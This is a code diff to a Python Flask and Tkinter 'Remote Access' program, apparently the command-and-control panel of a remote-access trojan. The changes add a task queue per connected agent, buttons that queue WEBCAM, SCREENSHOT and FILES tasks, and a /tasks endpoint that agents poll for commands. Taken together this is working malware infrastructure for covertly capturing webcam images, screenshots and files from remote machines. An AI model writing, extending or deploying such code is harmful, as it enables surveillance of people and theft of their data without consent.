@@ -23,6 +23,20 @@ class Connections:
         self.name = name
         self.time_last_seen = time.time()
         self.status = "online"
+        self.task_queue = []
+
+    def has_task(self):
+        return len(self.task_queue) > 0
+
+    def add_task(self, task):
+        self.task_queue.append(task)
+
+    def get_next_task(self):
+        if not self.has_task():
+            return None
+
+        return self.task_queue.pop(0)
+        
     
     
 
@@ -31,37 +45,59 @@ app = Flask(__name__)
 
 def render():
     global root, console
+
     root = tk.Tk()
     root.title("Remote Access")
     root.geometry("1200x800")
+    root.configure(bg="#0D0D0D")
 
-    
     console_frame = tk.Frame(root, width=500, bg="#000000")
     console_frame.pack(side="right", fill="y")
-    console_frame.pack_propagate(False)   
-    
+    console_frame.pack_propagate(False)
+
+    console_title = tk.Label(
+        console_frame,
+        text="Console",
+        bg="#000000",
+        fg="#FFFFFF",
+        font=("Menlo", 14, "bold")
+    )
+    console_title.pack(anchor="w", padx=10, pady=(10, 0))
+
     console = tk.Text(
-    console_frame,
-    bg="black",
-    fg="#FFFFFF",
-    font=("Menlo", 11),
-    state="disabled",
-    bd=0,
-    highlightthickness=0,
-    relief="flat",
-    cursor="arrow"
-)
+        console_frame,
+        bg="#000000",
+        fg="#FFFFFF",
+        font=("Menlo", 11),
+        state="disabled",
+        bd=0,
+        highlightthickness=0,
+        relief="flat",
+        cursor="arrow"
+    )
     console.pack(fill="both", expand=True, padx=10, pady=10)
-    
+
+
     active_frame = tk.Frame(root, width=700, bg="#0D0D0D")
-    active_frame.pack(side="left", fill="y")
-    active_frame.pack_propagate(False) 
-    
+    active_frame.pack(side="left", fill="both", expand=True)
+    active_frame.pack_propagate(False)
+
+    title = tk.Label(
+        active_frame,
+        text="Active Connections",
+        bg="#0D0D0D",
+        fg="#FFFFFF",
+        font=("Menlo", 18, "bold")
+    )
+    title.pack(anchor="w", padx=15, pady=(15, 5))
+
+
     connections_table = ttk.Treeview(
-    active_frame,
-    columns=("id", "ip", "os", "name", "status"),
-    show="headings"
-)
+        active_frame,
+        columns=("id", "ip", "os", "name", "status"),
+        show="headings",
+        selectmode="browse"
+    )
 
     connections_table.heading("id", text="ID")
     connections_table.heading("ip", text="IP")
@@ -69,62 +105,130 @@ def render():
     connections_table.heading("name", text="Name")
     connections_table.heading("status", text="Status")
 
-    connections_table.column("id", width=120)
-    connections_table.column("ip", width=120)
-    connections_table.column("os", width=100)
-    connections_table.column("name", width=180)
-    connections_table.column("status", width=100)
+    connections_table.column("id", width=130, anchor="center")
+    connections_table.column("ip", width=130, anchor="center")
+    connections_table.column("os", width=100, anchor="center")
+    connections_table.column("name", width=190, anchor="center")
+    connections_table.column("status", width=100, anchor="center")
 
-    connections_table.pack(fill="both", expand=True, padx=10, pady=10)
-    
+    connections_table.tag_configure("online", foreground="#00FF88")
+    connections_table.tag_configure("offline", foreground="#FF4444")
+
+    connections_table.pack(fill="both", expand=True, padx=15, pady=10)
+
+    # =========================
+    # Actions
+    # =========================
     actions_frame = tk.Frame(active_frame, bg="#0D0D0D")
-    actions_frame.pack(fill="x", padx=10, pady=10)
-    
-    def tmp():
-        pass
-    
-    
+    actions_frame.pack(fill="x", padx=15, pady=(0, 15))
+
+    def get_selected_agent_id():
+        selected = connections_table.selection()
+
+        if not selected:
+            log("[-] No agent selected")
+            return None
+
+
+        return selected[0]
+
+    def send_ui_task(task_name):
+        agent_id = get_selected_agent_id()
+
+        if not agent_id:
+            return
+
+        allowed_tasks = {
+            "WEBCAM": "WEBCAM",
+            "SCREENSHOT": "SCREENSHOT",
+            "FILES": "FILES"
+        }
+
+        if task_name not in allowed_tasks:
+            log(f"[-] Unknown task: {task_name}")
+            return
+
+        task = allowed_tasks[task_name]
+        
+        get_user(agent_id).add_task(task)
+        log(f"[+] {task} for {agent_id} queued")
+        
+        
+
     webcam_btn = tk.Button(
         actions_frame,
         text="WEBCAM",
-        command=lambda: send_ui_task("WEBCAM")
+        command=lambda: send_ui_task("WEBCAM"),
+        bg="#1A1A1A",
+        fg="#FFFFFF",
+        activebackground="#2A2A2A",
+        activeforeground="#FFFFFF",
+        relief="flat",
+        padx=15,
+        pady=6
     )
-    webcam_btn.pack(side="left", padx=5)
+    webcam_btn.pack(side="left", padx=(0, 8))
 
     screenshot_btn = tk.Button(
         actions_frame,
         text="SCREENSHOT",
-        command=lambda: send_ui_task("SCREENSHOT")
+        command=lambda: send_ui_task("SCREENSHOT"),
+        bg="#1A1A1A",
+        fg="#FFFFFF",
+        activebackground="#2A2A2A",
+        activeforeground="#FFFFFF",
+        relief="flat",
+        padx=15,
+        pady=6
     )
-    screenshot_btn.pack(side="left", padx=5)
+    screenshot_btn.pack(side="left", padx=8)
 
     file_btn = tk.Button(
         actions_frame,
         text="FILE",
-        command=lambda: send_ui_task("REPOS")
+        command=lambda: send_ui_task("FILES"),
+        bg="#1A1A1A",
+        fg="#FFFFFF",
+        activebackground="#2A2A2A",
+        activeforeground="#FFFFFF",
+        relief="flat",
+        padx=15,
+        pady=6
     )
-    file_btn.pack(side="left", padx=5)
-    
-    file_btn.pack(side="left", padx=5)
+    file_btn.pack(side="left", padx=8)
+
+
     def update_connections_list():
+        selected = connections_table.selection()
+        selected_id = selected[0] if selected else None
+
         for item in connections_table.get_children():
             connections_table.delete(item)
 
         for user in users:
+            status_tag = "online" if user.status == "online" else "offline"
+
             connections_table.insert(
                 "",
                 "end",
+                iid=user.id,
                 values=(
                     user.id,
                     user.ip,
                     user.os,
                     user.name,
                     user.status
-                )
+                ),
+                tags=(status_tag,)
             )
 
+        if selected_id and connections_table.exists(selected_id):
+            connections_table.selection_set(selected_id)
+            connections_table.focus(selected_id)
+
         root.after(1000, update_connections_list)
-    
+
+
     def update_console():
         while not log_queue.empty():
             message = log_queue.get()
@@ -136,45 +240,10 @@ def render():
 
         root.after(300, update_console)
 
-
-    def get_selected_agent_id():
-        selected = connections_table.selection()
-
-        if not selected:
-            log("[-] No agent selected")
-            return None
-
-        item = connections_table.item(selected[0])
-        values = item["values"]
-
-        agent_id = values[0]
-        return agent_id
-
-    def send_ui_task(task_name):
-        agent_id = get_selected_agent_id()
-
-        if not agent_id:
-            return
-
-        log(f"[*] {task_name} for {agent_id} pending . . .")
-        if task_name == "WEBCAM":
-            log("[-] Unknown task")  #######################################<<<<<<<<<<<<<<<<<<<<<<
-        elif task_name == "SCREENSHOT":
-            log("[-] Unknown task")
-        elif task_name == "REPOS":
-            log("[-] Unknown task")
-        else:
-            log("[-] Unknown task")
-            return
-
-        log(f"[*] Queued {task_name} for {agent_id}")
-
     update_connections_list()
     update_console()
-        
 
     root.mainloop()
-
 def log(message):
     print(message)
     log_queue.put(message)
@@ -200,6 +269,31 @@ def get_info():
         log(f"[+] {get_user(id).ip} connected")
         get_user(id).time_last_seen = time.time()
     return "OK"
+
+@app.route("/tasks", methods=["POST"])
+def task_check():
+    data = request.get_json()
+
+    if not data:
+        return jsonify({"error": "JSON required"}), 400
+
+    id = data.get("id")
+    endpoint = get_user(id)
+
+    if endpoint == False:
+        log("[-] Aborted: Unknown Endpoint")
+        return jsonify({"error": "unknown endpoint"}), 404
+
+    endpoint.time_last_seen = time.time()
+    endpoint.status = "online"
+
+    if endpoint.has_task():
+        task = endpoint.get_next_task()
+        return jsonify({"task": task})
+
+    return jsonify({"task": "NONE"})
+    
+    
 
 def handling_inactive_connections(connections):
     while True:
